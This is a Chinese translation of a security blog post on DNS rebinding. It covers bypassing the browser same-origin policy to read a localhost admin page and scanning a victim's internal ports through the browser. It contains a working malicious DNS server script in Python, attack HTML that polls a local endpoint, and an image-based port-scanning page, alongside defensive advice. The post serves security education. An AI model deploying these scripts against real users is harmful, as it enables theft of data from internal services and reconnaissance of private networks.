> 原文链接: https://www.anquanke.com//post/id/213413 


# DNS重绑定的利用：端口扫描与绕过同源策略


                                阅读量   
                                **149655**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者bookgin，文章来源：bookgin.tw
                                <br>原文地址：[https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/](https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t018e05390f380a5961.png)](https://p2.ssl.qhimg.com/t018e05390f380a5961.png)



在这篇文章中，我将介绍如何使用DNS重绑定来读取跨站的内容，而第二部分是利用DNS fallback机制来进行内网端口扫描。这两种攻击方式，只要求受害者点击链接打开含有恶意内容的网页。



## 利用一：同源策略绕过

众所周知，[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)是一个浏览器的基本安全策略。因为默认的情况下，浏览器会阻止获取来着非同源的内容。如果有一个用户访问了我的网站`example.com`，我就不可以用iFrame来窃取他在Youtube (youtube.com) 的浏览记录。

然而，域名后有个IP地址，假设 `example.com` 解析到 `93.184.216.34`, 而 `youtube.com` 解析到 `216.58.200.46`。这里有个很酷的办法：不改变域名，那就不会违反同源策略，但是又可以令浏览器实际上是从 `216.58.200.46`获取内容：
1. ① 受害者访问了我们含有恶意内容的网站 `example.com`，解析到自己的IP `240.240.240.240`.
1. ② 受害者正在获取`example.com/account/information`的内容，但是这时候域名解析到了 `216.58.200.46`.
1. ③ 但是此时请求并没有违反同源策略，因此我就可以读取其内容，并且把他发回我的log服务器
攻击成功！然而，当然 `youtube.com` 这么攻击时没用的，对于DNS重绑定技术的局限性和防御措施，请参考下面的防御措施部分。

### <a class="reference-link" name="%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"></a>攻击场景

所以可以假设有这样一个场景，当有个的管理员界面运行在 `127.0.0.1:8080`，因为它只能通过本地访问，所以你认为没有必要为它设置密码保护。倘若管理员界面中的敏感信息在`127.0.0.1:8080/account/information`，我们是可以绕过同源策略并且从这个页面上窃取信息。这个攻击场景是相当具有实际意义的，这儿有一个[真实的案例](https://miki.it/blog/2015/4/20/the-power-of-dns-rebinding-stealing-wifi-passwords-with-a-website/)。

假设受害者使用Chromium 71，并且点开了我们含有恶意内容的网站 `example.com:8080` ，一开始它被解析到 `240.240.240.240`。

不幸的是，DNS重绑定攻击没办法可以这么直接地实施。由于DNS缓存机制，当域名一开始解析到 `240.240.240.240` (攻击者的IP)，浏览器会把它缓存下来，并且下一次就不会再进行DNS查询了。

要绕过这个限制，我们可以自建DNS服务器，返回给多个A记录给客户端。

```
;; ANSWER SECTION:
example.com.    0    IN    A    240.240.240.240
example.com.    0    IN    A    0.0.0.0
```

当DNS服务器响应中包含多条A记录的时候，Chromium首先会尝试连接到 `240.240.240.240` ，如果`240.240.240.240` 无法访问(连接被拒绝或者路由不可达)，它就会使用`0.0.0.0` 作为fallback(备选)。

注意：Chromium并不一定总是会在一开始把域名解析到`240.240.240.240` ，还有可能会被解析到第二项 `0.0.0.0` (localhost)，出现这种情况的时候再试几次就好了。

`0.0.0.0` 才是要点所在，我们不能用 `127.0.0.1` ，否则Chrome会在一开始就直接把域名解析到 `127.0.0.1` ，这样我们就没法让受害者访问我们的恶意网站了。然而，在使用 `240.240.240.240` 和`0.0.0.0`的时候，Chrome才会在一开始先解析到`240.240.240.240`

因此，等受害者一访问 `example.com`， Chromium就会把它解析到`240.240.240.240`，如下是我们搭建的恶意网站的内容：

```
&lt;!doctype html&gt;
&lt;html&gt;
&lt;script&gt;
  var readContent = function() `{`
    fetch("//example.com:8080/account/information").then(r =&gt; r.text()).then(t =&gt; console.log(t));
  `}`;
  setInterval(readContent, 1000);
&lt;/script&gt;
&lt;/html&gt;
```

然而，我们之前说过Chromium会把`example.com` 的解析结果`240.240.240.240`缓存下来，这样一来我们就永远也没办法从 `0.0.0.0:8080`的管理员界面窃取数据了。因此我们要做的是，把位于 `240.240.240.240`的Web服务器暂时关掉，基于DNS fallback机制(再次访问的时候连接被拒绝)，Chromium就会从 `0.0.0.0:8080`.获取内容，这样一来，我们就能在不违反同源的前提下窃取数据了！

这个Poc在Chromium 71有用，其他复杂的PoC可以参见Github上的项目[singularit](https://github.com/nccgroup/singularity).

### <a class="reference-link" name="%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"></a>防御措施

不过，这种攻击也有一定的局限性。网站开发者们可以利用局限性来防止他们的网站受到攻击：

【1】不发送Cookie: 令网站只支持使用IP地址访问，这样浏览器就不可能把网站的Cookie发给攻击者了。<br>
【2】验证请求头中的`HOST`字段：令网站验证HTTP请求头里的`Host`字段，这样就杜绝了漏洞，因为HOST是`example.com:8080`.<br>
【3】使用HTTPS：当域名不正确的时候，浏览器会拒绝TLS连接。

### <a class="reference-link" name="%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"></a>攻击脚本

```
#!/usr/bin/env python3
# Python 3.6.4
#
# dnslib==0.9.7
from dnslib.server import DNSServer, DNSLogger, DNSRecord, RR
import time
import sys

class TestResolver:
    def resolve(self,request,handler):
        q_name = str(request.q.get_qname())
        print('[&lt;-] ' + q_name)
        reply = request.reply()
        print('[-&gt;] 240.240.240.240+127.0.0.1')
        reply.add_answer(*RR.fromZone(q_name + " 0 A 240.240.240.240"))
        reply.add_answer(*RR.fromZone(q_name + " 0 A 127.0.0.1"))
        return reply
logger = DNSLogger(prefix=False)
resolver = TestResolver()
server = DNSServer(resolver,port=53,address="0.0.0.0",logger=logger)
server.start_thread()
try:
    while True:
        time.sleep(1)
        sys.stderr.flush()
        sys.stdout.flush()
except KeyboardInterrupt:
    pass
finally:
    server.stop()
```



## 利用二：端口扫描

是不是发现DNS Fallback的机制还蛮有趣的？这个部分我们来谈谈如何利用这个机制进行内网端口扫描。

办法很直接，很容易就能想到，假设DNS解析结果长这样：

```
;; ANSWER SECTION:
example.com.    0    IN    A    127.0.0.1
example.com.    0    IN    A    240.240.240.240
```

因为：Chromium总是会首先把域名解析到 `127.0.0.1` ，而只有在连接`127.0.0.1`失败的时候，才会尝试去连接 `240.240.240.240`。所以说，我们可以利用这个现象来检测端口是不是开放的。

### <a class="reference-link" name="%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB"></a>开始攻击

基于浏览器的端口扫描恶意源码:

```
&lt;!doctype html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;div id="images"&gt;
  &lt;div&gt;
&lt;/body&gt;
&lt;script&gt;
  var images = document.getElementById("images");
  for (let port = 13337; port &lt; 13340; port++) `{`
    let img = document.createElement("img");
    img.src = `//example.com:$`{`port`}``;
    images.appendChild(img);
  `}`
&lt;/script&gt;
&lt;/html&gt;
```

我们在自己服务器 `240.240.240.240`上开放 13337 – 13340 端口，如果端口接收到了来自客户端的连接，那么这就意味着在受害者的本机上，对应的端口是关闭的。

为了能扫内网，我们想知道受害者的私有IP地址，HTML5 WebRTC技术可以用来泄漏受害者的私有IP地址，可以参考这个[PoC](https://diafygi.github.io/webrtc-ips/)。其实HTML5看上去还有很多的特性，这些特性很容易会被滥用。

当然也有另外的办法来实现端口扫描，可以参见这两位前辈的相关文章：

【1】基于WebRTC+XHR的延时攻击：[Skylined uses timing attack based on WebRTC+XHR](https://twitter.com/berendjanwever/status/735864169258450944?lang=en)<br>
【2】基于iframes和一些小技巧检测连接是否被拒绝：[Gareth Heyes uses iframes](https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning)

### <a class="reference-link" name="%E5%90%8E%E8%AE%B0"></a>后记

我一直在想：当点击一个无关痛痒的链接，即使我什么也不提供，会发生什么？攻击者可以做些什么？

【1】家庭网络内网扫描<br>
【2】找到IoT设备的网页入口 `192.168.1.2:8000` 以及在`192.168.1.1:8080`的WiFi管理员界面<br>
【3】发送恶意请求控制IoT设备，比如最简单的可以打开家里的门。<br>
【4】…

好吧，可能有点夸张，但这听起来真的有可能，看看[这篇文章](//medium.com/%40brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325))，不是嘛？下次点开链接之前记得三思而后行。



## 参考

Gareth Heyes, [基于浏览器进行端口扫描内网](https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning)

Skylined ([@berendjanwever](https://github.com/berendjanwever)), [内网扫描器](https://twitter.com/berendjanwever/status/735864169258450944?lang=en)

NCC Group Plc, [Singularity: 一个DNS重绑定攻击框架](https://github.com/nccgroup/singularity)

Michele Spagnuolo, [DNS重绑定的威力：用一个网站来窃取WiFi密码](https://miki.it/blog/2015/4/20/the-power-of-dns-rebinding-stealing-wifi-passwords-with-a-website/)

Brannon Dorsey, [用DNS重绑定攻击私有网络](https://medium.com/%40brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325)
